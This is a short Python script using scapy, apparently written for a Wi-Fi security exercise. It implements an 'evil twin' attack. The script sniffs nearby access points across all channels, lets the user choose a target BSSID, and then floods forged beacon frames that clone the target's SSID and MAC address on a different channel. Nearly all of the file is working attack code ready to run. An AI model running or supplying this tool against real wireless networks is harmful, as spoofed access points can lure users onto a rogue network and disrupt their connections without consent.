from scapy.all import *
from threading import Thread
import pandas
import time
import os

def get_freq(channel):
	return 2412 + (channel-1)*5




# Let user select network interface to perform attack
while(True): # Emulating do while in python
	ifaces = get_if_list() # Get interfaces in loop in case a new one appears
	iface=input("Name of desired interface to sniff and perform evil tween attack " + str(ifaces) + " : ")

	if(iface in ifaces):
		break

# Source for sniffing part: https://www.thepythoncode.com/code/building-wifi-scanner-in-python-scapy


#pandas.set_option("display.max_rows", 999)

# initialize the networks dataframe that will contain all access points nearby
networks = pandas.DataFrame(columns=["BSSID", "SSID", "dBm_Signal", "Channel", "Crypto"])
# set the index BSSID (MAC address of the AP)
networks.set_index("BSSID", inplace=True)

# Extract network infos
def callback(packet):
	if packet.haslayer(Dot11Beacon):
		# extract the MAC address of the network
		bssid = packet[Dot11].addr2
		# get the name of it
		ssid = packet[Dot11Elt].info.decode()
		try:
		    dbm_signal = packet.dBm_AntSignal
		except:
		    dbm_signal = "N/A"
		# extract network stats
		stats = packet[Dot11Beacon].network_stats()
		# get the channel of the AP
		channel = stats.get("channel")
		# get the crypto
		crypto = stats.get("crypto")
		networks.loc[bssid] = (ssid, dbm_signal, channel, crypto)

# Print networks infos
def print_all(stop):
	while True:
		os.system("clear")
		print(networks)
		print("\nPlease wait a few second while sniffing near networks...")
		time.sleep(0.5)
		
		if stop():
			break

# Scan network on all channel
def change_channel(stop):
	ch = 1
	while True:
		os.system(f"iwconfig {iface} channel {ch}")
		# switch channel from 1 to 14 each 0.5s
		ch = ch % 14 + 1
		time.sleep(0.5)


		if stop():
			break

# start the thread that prints all the networks
stop_threads = False
printer = Thread(target=print_all, args=(lambda: stop_threads,))
printer.daemon = True
printer.start()
# start the channel changer
channel_changer = Thread(target=change_channel, args=(lambda: stop_threads,))
channel_changer.daemon = True
channel_changer.start()
# start sniffing
sniff(prn=callback, iface=iface, timeout=10)

# stop the threads used for sniffing part
stop_threads = True
printer.join()
channel_changer.join()

if(networks.size == 0):
	print("There is no near networks")
else:
	print("Succefully found near network(s)")

	bssid = input("\nEnter bssid to attack : ")

	# Getting network infos
	ssid, dbm_signal, ch, crypto = networks.loc[bssid]


	# Creating new fake network six channel next to real one
	#ch = (ch + 6) % 14
	os.system(f"iwconfig {iface} channel {ch}")

	ch = (ch + 6) % 14

	# Build packet with scapyget_freq(1)
	p = RadioTap() / Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2=bssid, addr3=bssid) / Dot11Beacon() / Dot11Elt(ID="SSID", info=ssid, len=len(ssid)) / Dot11Elt(ID="DSset", info=chr(ch))
	
	print(f"\nCreating new network {ssid} on channel {ch}")
	print("Press <ctrl + C> to stop attack")
	sendp(p, inter=0.000001, iface=iface, loop=1) # Send packet every 0.5 seconds forever

print("Exiting...")
